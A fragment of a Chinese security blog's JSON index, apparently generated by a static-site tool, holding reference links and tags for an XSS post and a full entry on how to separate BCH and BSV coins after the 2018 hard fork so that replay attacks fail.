http://book.2cto.com/201301/14515.html http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss http://www.wooyun.org/bugs/wooyun-2010-015969 https://blog.csdn.net/u013648937/article/details/46629827","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"常规渗透","slug":"Web渗透/常规渗透","permalink":"http://yoursite.com/categories/Web渗透/常规渗透/"},{"name":"XSS","slug":"Web渗透/常规渗透/XSS","permalink":"http://yoursite.com/categories/Web渗透/常规渗透/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"},{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"常规渗透","slug":"常规渗透","permalink":"http://yoursite.com/tags/常规渗透/"}]},{"title":"BCH分叉-重放攻击解决方案","slug":"BCH分叉","date":"2018-07-22T18:11:33.000Z","updated":"2019-07-21T04:31:46.764Z","comments":true,"path":"2018/07/23/BCH分叉/","link":"","permalink":"http://yoursite.com/2018/07/23/BCH分叉/","excerpt":"","text":"BCH分叉 重放攻击解决方案BCH在进行硬分叉：分为BCH和BCHSV 对于分叉前拥有BCH的用户，在分叉后该钱包中会拥有BCH/BSV两种虚拟货币，若是分叉前钱包里有BCH，在硬分叉完成后，这个钱包里也会生成相应的BSV 目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击针对转账业务限制条件：该用户账户拥有BCH的同时也拥有BSV利用原理：在用户原意在分叉后转帐 BCH 时，该消息被攻击者广播在BSV链上，导致用户的BSV资产也被转移，受到重放攻击。 INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入分叉前的BCH，从而达到分离BCH与BSV的目的。具体操作如下： 在分叉完成后，用分叉后的BCH币充值到分叉前的BCH币所在的钱包，然后将这个钱包里所有的BCH币（分叉前的BCH和分叉后的BCH）转移到另一个地址。此次交易在BCH链可以成功完成，但是在BSV链上广播时却不能被节点接受，因为这笔交易离存在着分叉后的BCH币。这样子，BSV还是存在于原本的钱包中，达到了将BCH和BSV分离的目的。 构造特有的操作码交易：分叉后的BCH和BSV链的共识机制有一定的区别，主要体现在操作码上， BCH链上交易时，构造含有 OP_CHECKDATASIG 操作码的输出 BCHSV链上交易时，构造含有 OP_MUL 操作码的输出","categories":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://yoursite.com/categories/区块链安全/"}],"tags":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://yoursite.com/tags/区块链安全/"}]}]}